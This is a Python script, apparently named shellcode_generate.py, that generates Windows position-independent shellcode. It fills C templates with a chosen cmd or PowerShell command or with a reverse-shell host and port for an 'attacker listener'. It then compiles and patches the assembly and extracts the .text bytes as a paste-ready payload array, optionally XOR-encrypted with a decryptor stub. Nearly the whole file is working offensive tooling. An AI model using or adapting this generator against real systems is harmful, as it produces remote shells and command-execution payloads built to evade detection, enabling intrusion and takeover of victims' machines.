import subprocess
import argparse
import os
import glob
import time
import pefile
import random


def main():
    #
    # HANDLE USER ARGUMENTS
    #
    parser = argparse.ArgumentParser( description="This script will help develop and generate custom shellcode. If you've previously run the script be sure the --clean the directory to remove any old files!" )
    parser.add_argument( "-p", "--payload", choices=['cmd', 'ps', 'rs'], help="Select shellcode payload type" )
    parser.add_argument( "-c", "--command", help="The command to execute (required for cmd and ps modes)" )
    parser.add_argument( "-cl", "--clean", help="Clean the top level directory, removes all files except this py script and peb_structs.h", action="store_true" )
    parser.add_argument( "-host", "--host", help="Specify the IP address or hostname for reverse shell" )
    parser.add_argument( "-port", "--port", help="Specify the port for reverse shell" )
    parser.add_argument( "-e", "--enc", choices=['xor', 'b64'], help="Specify the encoding/encryption type" )
    args = parser.parse_args()

    if args.clean:
        print( "[!] Cleaning files" )
        clean()

    #
    # FUNCTION TO HANDLE CMD COMMAND EXECUTION
    #
    if args.payload == "cmd":
        if not args.command:
            parser.error( "The --command argument is required when mode is 'cmd' or 'ps'." )
        
        cmd( args.command, args.enc )
    
    #
    # FUNCTION TO HANDLE PS COMMAND EXECUTION
    #
    if args.payload == "ps":
        if not args.command:
            parser.error( "The --comand argument is requried when mode is 'cmd' or 'ps'." )
        
        ps( args.command, args.enc )
    
    #
    # FUNCTION TO HANDLE REVERSE SHELL
    #
    if args.payload == "rs":
        if not args.host or not args.port:
            parser.error( "A --host and --port argument is required when mode is 'rs'." )
        
        rev_shell( args.host, args.port, args.enc )




#
# CMD FUNCTION
#
# HANDLES USER COMMAND INPUT AND GENERATES THE 
# SHELLCODE TO EXECUTE THE COMMAND IN COMMAND PROMPT
# 
def cmd( command, encryption_type ):
    print( f"[+] Generating shellcode to execute: {command} in command prompt" )
    if encryption_type:
        print( f"[+] Shellcode will be encrypted via {encryption_type}" )
    
    #
    # MAKE THE DESIRED COMMAND INTO STACK STRING FORMAT
    # 
    formatted_command = ', '.join("'" + char + "'" for char in command)
    
    #
    # PULL TEMPLATE FILE AND WRITE THE DESIRED COMMAND
    #
    try:
        print( "[+] Pulling template file" )
        with open("code_templates/cmd_execute.c", 'r') as src_file, open("main.c", 'w') as dst_file:
            for line in src_file:
                if "char command[] =" in line: 
                    replacement_line = "\tchar command[] = { 'c', 'm', 'd', '.', 'e', 'x', 'e', ' ', '/', 'C', ' ', " + formatted_command + ", '\\0' };\n"
                    dst_file.write( replacement_line )
                    continue
                
                dst_file.write( line )
       
    except Exception as e:
        print( f"[!] An error occurred: {e}" )

    time.sleep(1) 

    print( "[+] File pulled successfully!" )
    print( "[!] Compiling file\n" )

    #
    # COMPILE THE FILE
    #
    compile_asm()

    #
    # FIX THE ASSEMBLY
    #
    fix_assembly()

    #
    # COMPILE ASSEMBLY TO EXECUTABLE
    #
    compile_exe()

    #
    # EXTRACT BYTES FROM EXECUTABLE
    #
    extract_shellcode( encryption_type )



#
# PS FUNCTION
# 
# HANDLES USER COMMAND INPUT AND GENERATES THE 
# SHELLCODE TO EXECUTE THE COMMAND IN POWERSHELL
def ps( command, encryption_type ):
    print( f"[+] Generating shellcode to execute: {command} in powershell" )
    
    #
    # MAKE THE DESIRED COMMAND INTO STACK STRING FORMAT
    # 
    formatted_command = ', '.join("'" + char + "'" for char in command)

    #
    # PULL TEMPLATE FILE AND WRITE THE DESIRED COMMAND
    #
    try:
        print( "[+] Pulling template file" )
        with open("code_templates/cmd_execute.c", 'r') as src_file, open("main.c", 'w') as dst_file:
            for line in src_file:
                if "char command[] =" in line: 
                    replacement_line = "\tchar command[] = { 'C', ':', '\\\\', '\\\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\\\', '\\\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\\\', '\\\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', 'P', 'o', 'w', 'e', 'r', 'S', 'h', 'e', 'l', 'l', '\\\\', '\\\\', 'v', '1', '.', '0', '\\\\', '\\\\', 'p', 'o', 'w', 'e', 'r', 's', 'h', 'e', 'l', 'l', '.', 'e', 'x', 'e', ' ', '-', 'C', 'o', 'm', 'm', 'a', 'n', 'd', ' ', '\"', " + formatted_command + ", '\"', '\\0' };\n"
                    dst_file.write( replacement_line )
                    continue
                
                dst_file.write( line )
       
    except Exception as e:
        print( f"[!] An error occurred: {e}" )

    time.sleep(1) 

    #
    # COMPILE THE FILE
    #
    compile_asm()

    #
    # FIX THE ASSEMBLY
    #
    fix_assembly()

    #
    # COMPILE ASSEMBLY TO EXECUTABLE
    # 
    compile_exe()

    #
    # EXTRACT BYTES FROM SHELLCODE
    #
    extract_shellcode( encryption_type )



#
# REVERSE SHELL FUNCTION
#
# HANDLES USER ADDRESS AND PORT AND GENERATES THE 
# SHELLCODE TO CONNECT TO ATTACKER'S LISTENER
#
def rev_shell( in_address, in_port, encryption_type ):
    print( f"[+] Generating shellcode to connect to attacker listener on: {in_address}:{in_port}" )
    #
    # MAKE THE DESIRED COMMAND INTO STACK STRING FORMAT
    # 
    formatted_host = ', '.join( "'" + char + "'" for char in in_address )

    #
    # PULL TEMPLATE FILE AND WRITE THE DESIRED COMMAND
    #
    try:
        print( "[+] Pulling template file" )
        with open("code_templates/rev_shell.c", 'r') as src_file, open("main.c", 'w') as dst_file:
            for line in src_file:
                if "char host[] =" in line: 
                    replacement_line = "\tchar host[] = { " + formatted_host + ", '\\0' };\n" 
                    dst_file.write( replacement_line )
                    continue
                
                if "short port =" in line:
                    replacement_line = "\tshort port = " + in_port + ";\n"
                    dst_file.write( replacement_line )
                    continue
                
                dst_file.write( line )
       
    except Exception as e:
        print( f"[!] An error occurred: {e}" )

    time.sleep(1)

    #
    # COMPILE THE FILE
    #
    compile_asm()

    #
    # FIX THE ASSEMBLY
    #
    fix_assembly()

    #
    # COMPILE ASSEMBLY TO EXECUTABLE
    # 
    compile_exe()

    #
    # EXTRACT BYTES FROM SHELLCODE
    #
    extract_shellcode( encryption_type )    



#
# COMPILE TO ASM FUNCTION
#
# COMPILES THE GENERATED 
# C FILE TO ASSEMBLY
def compile_asm():
    #
    # COMPILE THE FILE
    #
    compile_command = "cl.exe /c /FA /GS- main.c"
    compile_run = subprocess.run( compile_command, shell=True, text=True, capture_output=True )

    print( compile_run.stdout )
    print( compile_run.stderr )

    time.sleep(1)



#
# COMPILE TO EXE FUNCTION
#
# COMPILES THE FIXED ASSEMBLY 
# TO AN EXECUTABLE FOR EXTRACTION
def compile_exe():
    #
    # COMPILE ASSEMBLY TO EXECUTABLE
    #
    print( "[+] Compiling the assembly to executable" )
    print( "[+] You can run this executable to test if the functionality is good\n")
    compile_command = "ml64.exe fixed_main.asm /link /entry:AlignRSP"
    compile_run = subprocess.run( compile_command, shell=True, text=True, capture_output=True )

    print( compile_run.stdout )
    print( compile_run.stderr )    



#
# FIX ASSEMBLY FUNCTION
#
# CLEAN UP THE ASSEMBLY INSUTRCTIONS FROM THE 
# COMPILED C CODE AND REMOVE EXTERNAL DEPENDENCIES
#
def fix_assembly():
    #
    # 1. REMOVE EXTERNAL LIBRARIES
    #
    print( "[-] Removing eternal libraries from assembly file" )
    with open( "main.asm", "r" ) as file:
        lines = file.readlines()

    filtered_lines = []
    
    for line in lines:
        if "INCLUDELIB LIBCMT" not in line and "INCLUDELIB OLDNAMES" not in line:
            filtered_lines.append(line)
    
    with open( "fixed_main.asm", "w" ) as file:
        file.writelines(filtered_lines)

    #
    # 2. REMOVE PDATA AND XDATA SEGMENTS
    #   
    print( "[-] Removing pdata and xdata segments" )
    with open( "fixed_main.asm", "r" ) as file:
        lines = file.readlines()

    with open( "fixed_main.asm", "w" ) as file:
        skip = False
        for line in lines:
            if ("pdata" in line or "xdata" in line) and "SEGMENT" in line:
                skip = True
            elif "ENDS" in line and skip:
                skip = False
                continue
            if not skip:
                file.write(line)

    time.sleep(1)
    
    print( "[-] Removing pdata and xdata comments" )
    with open( "fixed_main.asm", "r" ) as file:
        lines = file.readlines()
    
    with open( "fixed_main.asm", "w" ) as file:
        for line in lines:
            if "pdata" in line or "xdata" in line:
                continue
            file.write(line)

    time.sleep(1)

    #
    # 3. FIX STACK ALIGNMENT 
    #
    print( "[+] Fixing stack alignment" )
    with open( "fixed_main.asm", "r" ) as file:
        lines = file.readlines()
    
    with open( "fixed_main.asm", "w" ) as file:
        flag = False
        for line in lines:
            if "_TEXT" in line and "SEGMENT" in line and flag == False:
                file.write(line) 
                file.write( "\n\n" )
                file.write( "; https://github.com/mattifestation/PIC_Bindshell/blob/master/PIC_Bindshell/AdjustStack.asm\n" )
                file.write( "AlignRSP PROC\n" )
                file.write( "\tpush rsi ; Preserve RSI since we're stomping on it\n" )
                file.write( "\tmov rsi, rsp ; Save the value of RSP so it can be restored\n" )
                file.write( "\tand rsp, 0FFFFFFFFFFFFFFF0h ; Align RSP to 16 bytes\n" )
                file.write( "\tsub rsp, 020h ; Allocate homing space for ExecutePayload\n" )
                file.write( "\tcall main ; Call the entry point of the payload\n" )
                file.write( "\tmov rsp, rsi ; Restore the original value of RSP\n" )
                file.write( "\tpop rsi ; Restore RSI\n" )
                file.write( "\tret ; Return to caller\n" )
                file.write( "AlignRSP ENDP\n" )
                file.write( "\n\n" )

                flag = True
            
            else:
                file.write(line)
    
    time.sleep(1)

    #
    # 4. FIX SYNTAX ISSUES
    #
    print( "[!] Fixing syntax issues" )
    with open( "fixed_main.asm", "r" ) as file:
        lines = file.readlines()

    with open( "fixed_main.asm", "w" ) as file:
        for line in lines:
            modified_line = line.replace( "gs:96", "gs:[96]" )    
            file.write( modified_line )
    
    time.sleep(1)



#
# EXTRACT SHELLCODE FUNCTION
#
# EXTRACT SHELLCODE FROM THE EXECUTABLE AND PRESENT 
# IT IN A FORMAT THAT THE USER CAN COPY AND PASTE
#
def extract_shellcode( encryption_type ):
    pe = pefile.PE( "fixed_main.exe" )
    text_section = next((s for s in pe.sections if s.Name.decode().strip('\x00') == '.text'), None)
    
    if not text_section:
        print("No .text section found in the executable.")
        return

    text_bytes = text_section.get_data()

    print( "[+] Successfully extracted .text section from the executable" )

    if encryption_type == "xor":
        print( "[+] XOR encrypting the shellcode!" )
        key = random.randint( 0x01, 0xFF )

        i = 0
        for byte in text_bytes:
            if i == 5:
                break
            print( f"[+] First byte check: 0x{byte:02x}" )
            i += 1

        print( f"[+] XOR generated key: 0x{key:02x}" )

        for byte in text_bytes:
            encrypted_bytes = bytes( [byte ^ key for byte in text_bytes] )

        with open( "shellcode.text", "w" ) as file, open( "code_templates/xor_decrypt.c", "r" ) as src_file:
            for line in src_file:
                if "unsigned char key =" in line:
                    replacement_line = "\tunsigned char key = " + f"0x{key:02x}; // This is the generated key!" 
                    file.write( replacement_line ) 
                    continue
                
                file.write( line )
            
            file.write( "\n\n" )

            c_array = ', '.join( f'0x{byte:02x}' for byte in encrypted_bytes )
            formatted_c_array = f'unsigned char payload[] = {{ {c_array} }};'
            file.write( formatted_c_array + "\n" )

    else:
        with open( "shellcode.text", "w" ) as file:
            c_array = ', '.join( f'0x{byte:02x}' for byte in text_bytes )
            formatted_c_array = f'unsigned char payload[] = {{ {c_array} }};'
            file.write( formatted_c_array + "\n" )
    
    time.sleep(1)

    print( "[+] Successfully saved shellcode to shellcode.text" )
    print( "[+] Copy/paste the shellcode and enjoy! :)")  



#
# CLEAN FUNCTION
# 
# REMOVES ALL FILES IN MAIN DIRECTORY EXCEPT FOR 
# THIS PYTHON FILE AND PEB STRUCTURES HEADER FILE 
# 
#    
def clean():
    directory = os.getcwd()
    os.chdir( directory )

    files_to_delete = []

    for file in glob.glob("*"): 
        if file != "peb_structs.h" and file != "shellcode_generate.py" and os.path.isfile(file):
            files_to_delete.append(file)

    for file in files_to_delete:
        try:
            os.remove(file)
            print( f"[-] Deleted: {file}" )
        except Exception as e:
            print( f"[!] Failed to delete {file}: {e}" )



if __name__ == "__main__":
    main()
